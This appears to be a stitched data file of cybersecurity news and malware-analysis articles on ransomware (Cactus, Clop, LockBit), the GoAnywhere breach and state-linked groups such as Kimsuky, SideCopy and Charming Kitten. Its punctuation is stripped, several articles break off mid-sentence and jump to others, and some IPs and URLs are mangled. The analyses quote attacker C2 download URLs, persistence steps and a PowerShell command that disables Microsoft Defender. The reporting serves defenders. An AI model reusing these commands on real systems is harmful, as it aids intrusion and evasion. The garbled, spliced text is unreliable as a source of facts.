emergency shutdown of the network to prevent the attack from spreadingMMC operations were completely shut down for almost two weeks until May 4 The latest update shows that while officials hoped to restore some walk-in services on May 3 the systems werent ready to go back onlineAt 10 am on May 4 MMC began accepting patients at its Pediatrics and Internal Family Medicine walk-in clinics for sick visits However the site is still not accepting regular appointments and the majority of its approximate 11 locations remain closedPatients took to social media to express concern over missed appointments closures and prescription refills An MMC spokesperson is promptly responding to those comments But some are frustrated at response times as well as long waits when calling into the health system with questions MMC is working with law enforcement and an outside firm to investigate the incident and identify the source and scope of the attack to return to normal clinic operations Officials said Our first priority was to contain the incident and protect our patients and employeesThe team is still working to restore the systems safely with enhanced security features and controls and is already working to strengthen its infrastructure to prevent a recurrence Officials said the quick detection by its technology experts limited the impact of the attackPreserving sensitive

964300 patients and 60 of its connected vendors that their data was accessed and exfiltrated by threat actors during a hack of its Fortra GoAnywhere MFT software-as-a-service in JanuaryThe GoAnywhere platform is used for the secure transfer of encrypted files between business partners and maintains detailed access logs for filesFortra warned clients of the zero-exploit in its file transfer solutions admin console in early February and provided a workaround as it worked on a patch However cybercriminals quickly released an active exploit that targeted the 1000 exposed on-prem GoAnywhere MFT instances or about 130 entitiesThe Brightline notification mirrors these earlier notices that Fortra was made aware of suspicious activity within certain instances of its GoAnywhere MFT service in January An investigation found a previously unknown vulnerability that allowed an attacker to access certain customer accounts and download filesBrightline was notified of the vulnerability on Feb 4 and launched a review which confirmed the access to its Fortra service While its network was not hacked the threat actors were able to acquire certain files saved in the platformThe data varied by patient but could include names contact information dates of birth member identification numbers dates of plan coverage andor employer names Brightline says Aetna member IDs were not compromised during the hackFortra has since deactivated the hackers credentials turned off the service and rebuilt Brightlines version of the platform to remove the vulnerability Brightline bolstered its own security as well which included limiting ongoing access to verified users removing all data from the service and reducing data exposure until the shift to an alternative file transfer serviceThe Fortra GoAnywhere hack mirrors the massive Accellion File Transfer Application attack reported in early 2021 The hack of a known vulnerability in the platform enabled access to hundreds of client systems and was easily the largest healthcare data breach reported in 2021 with over 351 million patients affectedThe GoAnywhere hack has affected companies in a range of sectors including Nintendo of

URL to the executable's Work function This function makes a request to the URL and attempts to decrypt and then execute the response In other words the NET executable can retrieve the next stage code and execute itFor these campaigns SideWinder also uses predictable URL structures when hosting their malicious filesThe longevity of these tactics techniques and procedures TTPs nearly 2 years gives us confidence that they can be utilized for the detection of future campaignsIn mid-March 2023 we discovered a new configured server delivering the payload This server was different in that it was configured so that a victim in Turkey could receive a second-stage payload This shows that this threat actor is also now targeting organizations in TurkeyThe SideWinder groups main target remains Pakistan government organizations The campaign investigated by BlackBerry in early March 2023 identified Turkey as a new targetThe SideWinder APT groups primary targets are in Southeast Asia regions such as Pakistan and Sri Lanka however government institutions in Pakistan still remain their main target of interestThe BlackBerry Threat Research and Intelligence team is actively monitoring this

file encryption and data theft - it added its own touch to avoid detectionResearchers at Kroll corporate investigation and risk consulting firm believe that Cactus obtains initial access into the victim network by exploiting known vulnerabilities in Fortinet VPN appliancesThe assessment is based on the observation that in all incidents investigated the hacker pivoted inside from a VPN server with a VPN service accountWhat sets Cactus apart from other operations is the use of encryption to protect the ransomware binary The actor uses a batch script to obtain the encryptor binary using 7-ZipThe original ZIP archive is removed and the binary is deployed with a specific flag that allows it to execute The entire process is unusual and the researchers that this is to prevent the detection of the ransomware encryptorIn a technical report Kroll investigators explain that there are three main modes of execution each one selected with the use of a specific command line switch setup -s read configuration -r and encryption -iThe -s and -r arguments allow the threat actors to setup persistence and store data in a CProgramDatantuserdat file that is later read by the encryptor when running with the -r command line argumentFor the file encryption to be possible thougha unique AES key known only to the attackers must be provided using the -i command line argumentThis key is necessary to decrypt the ransomware's configuration file and the public RSA key needed to encrypt files It is available as a HEX string hardcoded in the encryptor binaryDecoding the HEX stringprovides a piece of encrypted data that unlocks with the AES keyCACTUS essentially encrypts itself making it harder to detect and helping it evade antivirus and network monitoring tools Laurie Iacono Associate Managing Director for Cyber Risk at Kroll told Bleeping ComputerRunning the binary with the correct key for the-iencryption parameter unlocks the information and allows the malware to search for files and start a multi-thread encryption processKroll researchers provided the diagram below to better explain the Cactus binary execution process as per the selected parameterWhen preparing a file for encryption Cactus changes its extension to CTS0 After encryption the extension becomes CTS1HoweverGillespie explained that Cactus can also has a quick mode which is akin to a light encryption pass Running the malware in quick and normal mode consecutively results in encrypting the same file twice and appending a new extension after each process eg CTS1CTS7Krollobserved that the numberat the end of the CTS extension varied in multiple incidents attributed to Cactus ransomwareOnce in the network the threat actor used a scheduled task for persistent access using an SSH backdoor reachable from the command and control C2 serverAccording to Kroll investigators Cactus relied on SoftPerfect Network Scanner netscan to look for interesting targets on the networkFor deeper reconnaissance the attacker used PowerShell commands to enumerate endpoints identify user accounts by viewing successful logins in Windows Event Viewer and ping remote hostsKroll investigators say that after escalating privileges on a machine Cactus operators run a batch script that uninstalls the most commonly used antivirus productsLike most ransomware operations Cactus also steals data from the victim For this process the threat actor uses the Rclone tool to transfer files straight to cloud storageAfter exfiltrating data the hackers used a PowerShell script called TotalExec often seen in BlackBasta ransomware attacksto automate the deployment of the encryption processGillespie told us that the encryption routine in Cactus ransomware attacks is uniqueDespite this it does not appear to be particular to Cactus as a similar encryption process has also been adopted recently by the BlackBasta ransomware gangAt the moment there is no public information about the ransoms that Cactus demands from its victims but BleepingComputer has been told by a source that they are in the millionsEven if the hackers do steal data from victims it appears that they have not set up a leak site like other ransomware operations involved in double-extortionHowever the threat actor does threaten victims with publishing the stolen files unless they get paid This is explicit in the ransom noteExtensive details about the Cactus operation the victims they target and if the hackers keep their word and provide a reliable decryptorif paid are not available at this timeWhat is clear is that the hackers'incursions so far likely leveraged vulnerabilities in the Fortinet VPN appliance and follow the standard double-extortion approach by stealing data before encrypting itApplying the latest software updates from the vendor monitoring the network for large data exfiltration tasks and responding quickly should protect from the final and most damaging stages of a ransomware attack"

        "text": "By Tom Hegel and Aleksandar MilenkoskiHistorically Kimsuky targets have been located across countries in North America Asia and Europe In the groups latest campaigns they continue their global targeting themed around various ongoing geopolitical topics For example the latest Kimsuky campaigns have focused on nuclear agendas between China and North Korea relevant to the ongoing war between Russia and UkraineFor the deployment of ReconShark Kimsuky continues to make use of specially crafted phishing emails Notably the spear-phishing emails are made with a level of design quality tuned for specific individuals increasing the likelihood of opening by the target This includes proper formatting grammar and visual clues appearing legitimate to unsuspecting users Notably the targeted emails which contain links to download malicious documents and the malicious documents themselves abuse the names of real individuals whose expertise is relevant to the lure subject such as Political ScientistsIn the malicious emails Kimsuky entices the target to open a link to download a password-protected document Most recently they made use of Microsoft OneDrive to host the malicious document for download For example as used against KRG the lure email contained the OneDrive shared file linkThe file downloaded is a password protected doc file named Research Proposal-Haowen Songdoc SHA1 86a025e282495584eabece67e4e2a43dca28e505 which contains a malicious macro SHA1 c8f54cb73c240a1904030eb36bb2baa7db6aeb01The ability of ReconShark to exfiltrate valuable information such as deployed detection mechanisms and hardware information indicates that ReconShark is part of a Kimsuky-orchestrated reconnaissance operation that enables subsequent precision attacks possibly involving malware specifically tailored to evade defenses and exploit platform weaknessesThe main responsibility of ReconShark is to exfiltrate information about the infected platform such as running processes information about the battery connected to the system and deployed endpoint threat detection mechanismsSimilar to previous BabyShark variants ReconShark relies on Windows Management Instrumentation WMI to query process and battery informationReconShark checks for the presence of a broad set of processes associated with detection mechanisms such as ntrtscanexe Trend Micro OfficeScan mbamexe Malwarebytes Anti-Malware NortonSecurityexe Norton Security and avpuiexe Kaspersky Internet SecurityIn contrast to previous BabyShark variants ReconShark exfiltrates information without first storing it on the filesystem the malware stores the information it collects in string variables and then uploads them to the C2 server by issuing HTTP POST requestsIn addition to exfiltrating information ReconShark deploys further payloads in a multi-stage manner that are implemented as scripts VBS HTA and Windows Batch macro-enabled Microsoft Office templates or Windows DLL files ReconShark decides what payloads to deploy depending on what detection mechanism processes run on infected machinesSome ReconShark strings are encrypted using a relatively simple cipher to evade static detection mechanisms These strings are typically commands or scripts for downloading andor executing payloadsReconShark deploys and executes payloads in different ways For example the malware can directly download a payload from the C2 server using the curl utility but also use Windows Shortcut LNK files or Office templates for that purposeReconShark edits Windows Shortcuts LNK files to the msedgeexe Microsoft Edge chromeexe Google Chrome outlookexe Office Outlook whaleexe Whale browser and firefoxexe Mozilla Firefox applications When executed these LNK files start the linked legitimate applications and execute malicious code at the same timeFurther ReconShark replaces the defaultAppDataMicrosoftTemplatesNormaldotm Office template which opens whenever a user starts Microsoft Word with a malicious Office template hosted at the C2 server This effectively compromises the execution of Microsoft WordReconShark edits LNK files top and deploys a malicious Normaldotm Office template bottomThe payload staging ends with Windows Batch or VBS scripts that create the AppData1 file with a content of ss or sss These files may represent markers of a successful ReconShark executionAll observed infrastructure in this campaign are hosted on a shared hosting server from NameCheap whom weve already notified of this malicious activity and recommended takedowns

mitmailtech are used for command and control The domain yonseilol has been active since December 2022 with malicious activity occurring as recently as this week rfaink has been actively used since early February 2023 and mitmailtech since mid January 2023 Kimsuky also made use of newshareonline as a C2 server for a short time at the end of 2022As shown in the ReconShark macro example beacons are made to the bio directory of rfaink During our analysis of the activity the attacker made multiple attempts at renaming that directory including bio433ertgd12 then later bio234567890rtyui and a day later returning back to bio This may have been an attempt to hinder research efforts or pause the intake of new victims for unknown reasons The IOC table below highlights each of the URL paths Kimsuky manages across each C2 domain and their specific purpose according to the execution flow in the macro These patterns match across domains while the directory they are placed in often varies Attempted navigation to some paths on C2 domains are configured to redirect visitors to the legitimate Microsoft websiteThe ongoing attacks from Kimsuky and their use of the new reconnaissance tool ReconShark highlight the evolving nature of the North Korean threat landscape Organizations and individuals need to be aware of the TTPs used by North Korea state-sponsored APTs and take necessary precautions to protect themselves against such attacks The link between recent activity and a wider set of previously unknown activity attributed to North Korea underscores the need for continued vigilance and collaborationGet notified when we post new contentThanks Keep an eye out for new contentIn the era of interconnectivity when markets geographies and jurisdictions merge in the melting

        "text": "FortiGuard Labs Threat ResearchAffected Platforms WindowsImpacted Users Windows usersImpact Controls victims machine and collects sensitive informationSeverity Level MediumOccasionally FortiGuard Labs researchers come across a file name or e-mail subject that makes us sit up and take notice Of course it may turn out to be nothing But every once in a while one of these turns out to be incredibly interestingWe recently came across one such file that referenced an Indian state military research organization and an in-development nuclear missile The file was meant to deploy malware with characteristics matching the APT group SideCopy With activities dating back to at least 2019 this group has aligned its targeting with the goals and objectives of the Pakistani governmentThe SideCopy APT group is known to leverage similar TTPs Tactics Techniques and Proceduresand in some cases utilizes the same infrastructuresas another Pakistan-based threat actor group known as Transparent Tribe Some reports even claim that SideCopy is a subsidiary of Transparent Tribe The group was allegedly named SideCopy because an infection chain they employed was copied from the long-time Indian threat actor group SideWinder in a likely attempt to make attribution more difficult Although SideCopy primarily targets Windows platforms some reports indicate they have deployed malware to compromised Mac and Linux machinesThe initial infection vector is suspected to be a phishing e-mail However that information was not available to FortiGuard Labs at the time of our investigation That said we do have access to a Zip file that would have been the likely attachment to an e-mailThe Zip file contains three files with two of them meant to be deployed in a subdirectory of the extraction locationThe officetemplatemac and officetemplateui files appear to contain unformatted data and have no bearing on the infection chain They seem to function as decoys to make the third file DRDO-K4 Missile Clean roompptxlnk appear more legitimateThis is a Microsoft Windows shortcut file On any Windows system with file extensions hidden the lnk extension would not be visible making it appear as DRDO-K4 Missile Clean roompptx This deception makes it more difficult to distinguish the file as malicious simply by looking at itThe Windows shortcut file does not open a PowerPoint file at least immediately Instead it reaches out to a domain controlled by the attacker using the utility for Microsoft HTML Applications HTAs or mshtaexeIn this case the command line argument points to a URL At the other end of the URL is a malicious file Pantomimehta that will be downloaded and executedhXXpcornerstonebeverlyorgjsfilesdocufentososodoecumentosonesopantomimehtaPantomimehta contains several sections of note The head of the file validates the Net version installed on the victim machine and verifies whether the folder CProgramDataHP is present If not it will create itMost of the rest of the file is dominated by two encoded sections stored in variables dividAndRule and punctureTyres Both are base 64 encoded albeit in slightly different waysIts helpful to start with the second section first as it has to be read first for the code to be executed properlyAsFigure 6shows punctureTyres is passed to the function basforsixfourstream as shown in Figure 5 which decodes it from base64The newly decoded punctureTyres is deserialized read into a memory stream where it can be executedContained within this stream is a Microsoft Net library named htadll It includes a function called RealityShow that is used to pass the base64-encoded variable dividAndRule so the file DRDO-K4 Missile Clean roompptx can be deployed as well as the next stage of the malwareAs mentioned htadll aims to deploy DRDO-K4 Missile Clean roompptx It can be deployed as well as the next stage of the malwareAfter being called from Pantomimehta the function openthefile takes the data from dividAndRule decodes it from base64 and decompresses it due to it being a GZip compressed data stream It then opens the file for displayAdditionally the function getThirdStrike is called to begin the next phase of infectiongetThirdStrike establishes the download location for what will become the file jqueryhta It then sends that on the function runItOn to reach out to hXXpcornerstonebeverlyorgjsfilesntfontsjquerytxt to download the filegetThirdStrike also assesses the antivirus situation on the victim machine and passes that information on via an HTTP POST through the pkginfinity function which will reach out to hXXpcornerstonebeverlyorgjsfilesntfontsavenaOnce all of this occurs the execution of jqueryhta commencesUnlike the shortcut that shares its name this is an actual Microsoft PowerPoint fileThe PowerPoint deck contains 22 slides and is a convincing treatise on the requirements for building a cleanroom environment to suit the needs of a major aerospace project in that region of the globe The file however is entirely benign and operates as a decoy to conceal other activities being undertakenjqueryhta is very similar in structure and purpose to Pantomimehta It advances the infection by deploying additional files from multiple variables with encoded data It seems to have also been created by SILENTTRINITYThe head of the file contains the function decodebase64 a custom implementation to decode base 64-encoded data that will be used later and a large encoded section attached to a variable called addle Like Pantomimehta this gets executed once the next section is decoded and executedThe variable InMomemerandum contains the base64-encoded data for another Net DLL called PreBotdllThe function decodebase64 fromFigure 12is now being used to decode a small block of base64 text U2VsZWN0ICogRnJvbSBBbnRpVmlydXNQcm9kdWN0 This translates to Select From AntiVirusProduct a Windows Management Instrumentation WMI query to obtain information on what type of antivirus products may be installed on the systemFigure 14shows that InMomemerandum will be sent to a function to decode it from base 64in this case the function bazSixFerToStreeeemStranger It is then deserialized to run PreBotdll in memory after which point the data from the variable addle is passed to the function PinkAgainThe opening class declaration of DraftingPad contains the path destinations for the files remaining to be deployed for this attackIn addition to containing the desired landing locations for the remaining files some additional base 64 encoded text is assigned to the variable BatFileBytesThe PinkAgain function takes the data passed from jqueryhta in the form of a base 64-encoded GZip-compressed stream of bytes and the antivirus settings of the victim machine and route them to a function that will deal with them appropriatelyThe purpose of testbat is to create a registry key called Windows Update Schedule in the HKCUSOFTWAREMicrosoftWindowsCurrentVersionRun registry hive The naming convention attempts to assist it in blending in as something that looks legitimateThis ensures that the file CUsersPublichpcridvizexe is executed upon each system restartFinally DUserdll is decompressed and deposited into its target location of CUsersPublichp alongside cridvizexe This contains the main code for a Remote Access Trojan RAT that will be used along with the aforementioned credvizexe by having its code sideloaded httpsattackmitreorgtechniquesT1574002 into it when it launchesThe file CUsersPublichpcridvizexe is copied from its usual location at either CWindowsSysWOW64credwizexe or CWindowsSystem32credwizexe depending on the systems architecture to the above location with the filename slightly alteredcridvizexe is the Credential Backup and Restore Wizard used as part of the Windows Credential Manager to provide a method for backing up and restoring saved credentials on the systemAs mentioned previously the SideCopy RAT doesnt exist as a separate executable It has to have assistance via another application to load its code into memory and execute it In this case its cridvizexe It uses sideloading to do this which is to say that a dependency of the legitimate application is highjacked to allow the malicious code to load This is done by dropping the malicious DLL DUserdll in the directory with cridvizexeInterestingly DUserdll isnt a direct dependency requirement It is actually a requirement of two other libraries that cridvizexe requires COMCTL32dll and SHELL32dll The result of doing this is that it makes tracing the source of the malicious code much more difficultThe end state for this attack is the deployment and execution of DUserdll As alluded to above a legitimate version of this file normally resides in CWindowsSysWOW64As shown inFigure 23 comparing the illegitimate and legitimate files indicates several differences Notably whats available in the File description and File version fields as well as the size of the files with the malicious one being considerably smallerUpon execution DUserdll reaches out to hXXp1449172178080 as a command and control C2 node to both send and receive toThe actions performed by the RAT use a distinctive user-agent string cpp-httplib07 making it stand out in traffic It can communicate over TCP using raw sockets or via HTTP The RAT can also perform other less common HTTP verb-related operations such as PUT and PATCHThe RAT can start other processes if instructed using the CreateProcessW Windows API call This would be useful for launching additional payloads once a foothold on the target system has been achievedA targeted campaign where the attacker takes the time to create a lure relevant enough for a target to pursue will always open more doors for an attacker In this case we saw SideCopy deliver one that would be of interest only to a small group of people in the Indian defense industryTargets in this position would be of definite interest to the Government of Pakistan and any threat actors that align with its aimsFortinet customers are already

        "text": "Microsoft on Wednesday alleged that the recent attacks on the popular PaperCut servers are tied to the Clop and LockBit ransomware groups which use critical and high severity vulnerabilities in PaperCuts NGMF print management products to steal sensitive corporate dataAccording to Microsoft Lace Tempest runs as a Clop ransomware affiliate that has been observed using GoAnywhere exploits and Raspberry Robin infection hand-offs in past ransomware campaigns The threat actor incorporated the PaperCut exploits into their attacks as early as April 13 In observed attacks Microsoft said Lace Tempest ran multiple PowerShell commands to deliver a TrueBot DLL which connected to a C2 server attempted to steal LSASS credentials and injected the TrueBot payload into the conhostexe service While Microsofts attribution to Lace Tempest adds an interesting wrinkle the more interesting piece of this puzzle is the timeline of exploitation of this issue by the threat actors said Zach Hanley chief attack engineer at Horizon3ai Hanley said PaperCut and the Zero Day Initiative published the vulnerability descriptions in mid-March By mid-April the threat actors had developed a working exploit for the described issue and were conducting mass ransomware campaigns for all internet exposed servers well before any public exploit was availableThis may indicate the threat actors are actively monitoring sources of vulnerability threat intelligence like Zero Day Initiatives Upcoming Advisories which list affected vendors before a patch becomes available and official CVEs are created said Hanley The threat actors are seemingly investing in targeted vulnerability research when a vulnerability affects enough internet-facing devices to be the precursor to their ransomware campaigns This continuous threat-intelligence loop will play an increasingly important role in organizations security models as threat actors become more efficient at itHeath Renfrow co-founder at Fenix24 added that Clop functions as a very active organized ransomware-as-a-service RaaS operation with connections to other criminal gangs and their affiliates have been making news a lot recently by exploiting unpatched vulnerabilities such as the recent GoAnywhere attacks Renfrow said they are also seeing a lot of Clop cases in their ransomware remediation practice adding that Clop actors prefer extortion over strictly encryption-based attacks and these PaperCut incidents are ripe for exploitation for Clop because of the data available for exfiltrationThey find any vulnerability they can use as a wedge to steal data and extort the organization said Renfrow LockBit is also getting into the game on this vulnerability though they are more focused on encryption for ransomRenfrow said the PaperCut case is a good example of securing any network-connected device and cannot be written off as a lesser threat to the enterprise and that it's essential to watch threat feeds for critical vulnerabilities and patch quicklyPrinters can store and save very mission-sensitive data anything from MA documents to HR documentation and they also enable entry to the network in general and that makes PaperCut vulnerabilities significant he concludedAfter admitting responsibility for compromising Sony a Colonial Pipeline supplier and a Hawai'i government site the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates reports The Record a news site by cybersecurity firm Recorded FutureUS advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39111 individuals around the world had their data compromised following a ransomware attack earlier this year which has been claimed by the LockBit ransomware operation reports BleepingComputerAttack on the US subsidiary of the Industrial Commercial Bank of China disrupted Treasury trading in New York earlier this week Tue Jun 25Thu Dec 14Thu Nov 16 Copyright 2023 CyberRisk Alliance LLC All Rights Reserved This material may not be published broadcast rewritten or redistributed in any form without prior authorization"

        "title": "Unpacking BellaCiao A Closer Look at Irans Latest Malware",
        "text": "April 26 2023 The name used by malware developers is BellaCiao a reference to the Italian folk song about resistance fighting We have identified multiple victims in the United States and Europe but also in the Middle East Turkey or IndiaIn a speech on 17 March 2021 Ebrahim Raisi then chief justice of Iran declared The Islamic Revolutionary Guard Corps has excelled in every field it has entered both internationally and domestically including security defense service provision and construction In August 2021 Raisi replaced more moderate candidate Hassan Rouhani as the president of Iran Starting only one month after his inauguration cyberattacks attributed to IRGC threat actors started increasing in scope scale and sophisticationQuick weaponization of publicly disclosed PoCs is the new winning formula for both financially motivated and state-sponsored threat actorsFig 1 An example flow of hybrid attackOne crucial aspect of this emerging attack method is that there can be a significant time gap between the automated and manual phases For instance when initial access brokers are involved a compromised server with a webshell may remain dormant until an interested buyer is found and the transaction is completed Alternatively threat actors may compromise more servers than they can handle creating a backlog of compromised networksThreat actors with lower levels of sophistication can exploit the absence of advanced detection capabilities like EDR XDR or MDR on compromised networks making this tactic highly effective until such tools become more widely adopted More sophisticated threat actors including Charming Kitten are trying to stay ahead of defenders by using custom tools to evade detection Custom-developed malware also known as tailored malware is generally harder to detect because it is specifically crafted to evade detection and contains unique codeDuring our investigation we have located multiple BellaCiao samples Each sample collected was tied up to a specific victim and included hardcoded information such as company name specially crafted subdomains or associated public IP address Because all binaries are highly customized and can reveal information about victims we are not including information such as MD5 or SHA256 hashes in this reportAll samples that we collected included pdb paths PDB Program DataBase is a file format used by Microsoft Visual Studio for storing debugging information about an executable or DLL file We used it to extract build information of project including the project name and path that was configured in Visual StudioZBellaCiaoBellaCiaoMore TargetsCountryPublic IPHostnamebackdoorMicrosoftAgentServicesMicrosoftAgentServicesobjReleaseUsing information from these files we can learn that victims were organized in different folders by country using folder names like ILIsrael TRTurkey ATAustria INIndia or ITItaly The original developer named this project BellaCiao a reference to an Italian folk song that is an anthem of resistance and freedom It is possible that the use of the name BellaCiao by Iranian hackers can be a symbolic reference to their perceived struggle against the world but this is speculative and there is no concrete evidence to support this theory Ultimately the true reasons behind the choice of this name may only be known to the individuals or group responsible for the malware Information about Public IP and Hostname are relevant for communication with C2 infrastructure we will describe this process laterUpon deployment BellaCiao immediately attempts to disable Microsoft Defender using the following PowerShell commandpowershellexe -exec bypass -c Set-MpPreference -DisableRealtimeMonitoring trueA new service instance is created to establish persistence Legitimate process names specific to Microsoft Exchange server were used to blend in a common technique known as masqueradingThreat actors also attempted to download two IIS backdoors from http18816517419918080 The BellaCiao executable is written to one of the following locationsThese executables run as a service eg Microsoft Exchange Services Health The BellaCiao is a dropper malware it is designed to deliver other malware payloads onto a victims computer system based on instructions from C2 server The payload delivered by BellaCiao is not downloaded but hardcoded into the executable as malformed base64 strings and dumped when requestedTo receive instructions from C2 server BellaCiao is using unique approach of domain name resolution and parsing of the returned IP addressA DNS request is performed every 24 hours to resolve a subdomain hardcoded string unique for each victim using the following pattern2 random uppercase letters3 random lowercase lettersvictim specific subdomainC2 domainThe executable code of BellaCiao compares a resolved IP address returned by a DNS server under the control of a threat actor with an IP address that has been hardcoded into the program The resolved IP address is like the real public IP address but with slight modifications that allow BellaCiao to receive further instructions It's important to note that BellaCiao only operates with two fixed values - a hardcoded IP string local IP we will use L1L2L3L4 for examples and the IP address returned by the DNS server controlled by the threat actor remote IP - R1R2R3R4 The code does not contain the actual IP address rather it mimics its format to give the impression that the DNS requests are validWhen comparing these two IP addresses there are three potential scenarios depending on the last octet of an IP addressAfter receiving instructions to deploy webshell local IP equals resolved IP other octets segments of IP address are parsed to identify the folder and filename to useBelow is the list of octets and which aspect of webshell deployment they impactIf we use a Google Public DNS server address 8888 as an example here are few deployment scenarios depending on resolved IP addressThe dropped aspx webshell supports 3 operationsThe User-Agent string must start with a secret code ruby123 to make sure that the request is coming from threat actors followed by requested operationWe have also analyzed the second variant of BellaCiao that contains different payload This second variant drops the Plink tool and PowerShell script hardcoded locations
